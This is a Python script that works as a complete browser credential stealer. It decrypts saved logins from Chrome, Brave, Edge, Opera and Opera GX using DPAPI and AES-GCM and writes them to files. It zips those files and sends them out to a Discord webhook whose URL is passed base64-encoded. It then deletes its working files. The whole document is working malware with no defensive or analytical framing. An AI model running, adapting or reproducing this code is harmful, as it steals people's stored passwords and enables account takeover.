import os
import json
import subprocess
import websocket
import requests
import sqlite3
import base64
import argparse
import zipfile
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import win32crypt

def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        encrypted_data = encrypted_password[15:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_password = decryptor.update(encrypted_data)[:-16].decode()
        return decrypted_password
    except Exception as e:
        print(f"Error decrypting password: {str(e)}")
        return ""

def decode_base64(encoded_str):
    try:
        return base64.b64decode(encoded_str).decode('utf-8')
    except Exception as e:
        print(f"Error decoding Base64 string: {e}")
        return None

def get_passwords(local_state_path, login_db_path, temp_db_name):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]

        temp_db_path = f"{temp_db_name}.db"
        shutil.copyfile(login_db_path, temp_db_path)

        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        credentials = []
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            password = decrypt_password(encrypted_password, decrypted_key)

            if username and password:
                credentials.append(f"URL: {url} | USERNAME: {username} | PASSWORD: {password}")

        cursor.close()
        conn.close()
        os.remove(temp_db_path)

        return credentials
    except Exception as e:
        print(f"Error retrieving passwords: {str(e)}")
        return []

def get_chrome_passwords():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    login_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    return get_passwords(local_state_path, login_db_path, "ChromeData")

def get_brave_passwords():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")
    login_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
    return get_passwords(local_state_path, login_db_path, "BraveData")

def get_edge_passwords():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
    login_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
    return get_passwords(local_state_path, login_db_path, "EdgeData")

def get_opera_passwords():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
    login_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data")
    return get_passwords(local_state_path, login_db_path, "OperaData")

def get_opera_gx_passwords():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State")
    login_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data")
    return get_passwords(local_state_path, login_db_path, "OperaGXData")

def save_to_file(output_dir, file_name, data):
    try:
        os.makedirs(output_dir, exist_ok=True)
        file_path = os.path.join(output_dir, file_name)
        with open(file_path, "w", encoding="utf-8") as f:
            f.write("\n".join(data))
        return file_path
    except Exception as e:
        print(f"Error saving to file {file_name}: {str(e)}")
        return None

def zip_files(directory, zip_name):
    zip_path = os.path.join(directory, zip_name)
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(directory):
            for file in files:
                zipf.write(os.path.join(root, file), arcname=file)
    return zip_path

def send_to_discord(embed_data, file_path, webhook_url):
    with open(file_path, "rb") as f:
        files = {"file": (os.path.basename(file_path), f)}
        response = requests.post(webhook_url, data={"payload_json": json.dumps(embed_data)}, files=files)
        if response.status_code == 204:
            print("Successfully sent data to Discord.")
        else:
            print(f"Failed to send data to Discord: {response.status_code} {response.text}")

def main():
    parser = argparse.ArgumentParser(description="Extract passwords and send to Discord.")
    parser.add_argument("webhook_base64", type=str, help="Base64-encoded Discord webhook URL.")
    args = parser.parse_args()

    webhook_url = decode_base64(args.webhook_base64)
    if not webhook_url:
        print("Invalid webhook URL provided.")
        exit(1)

    output_dir = "./pass"
    credentials = {
        "Chrome": get_chrome_passwords(),
        "Brave": get_brave_passwords(),
        "Edge": get_edge_passwords(),
        "Opera": get_opera_passwords(),
        "Opera GX": get_opera_gx_passwords()
    }

    embed = {
        "embeds": [
            {
                "title": "Password Extraction Report",
                "description": "Details of extracted passwords",
                "color": 16711680,
                "fields": []
            }
        ]
    }

    for browser, creds in credentials.items():
        file_path = save_to_file(output_dir, f"{browser.lower()}_passwords.txt", creds)
        embed["embeds"][0]["fields"].append({
            "name": browser,
            "value": f"{len(creds)} passwords extracted",
            "inline": True
        })

    zip_path = zip_files(output_dir, "passwords.zip")
    send_to_discord(embed, zip_path, webhook_url)

    # Cleanup
    shutil.rmtree(output_dir, ignore_errors=True)

if __name__ == "__main__":
    main()
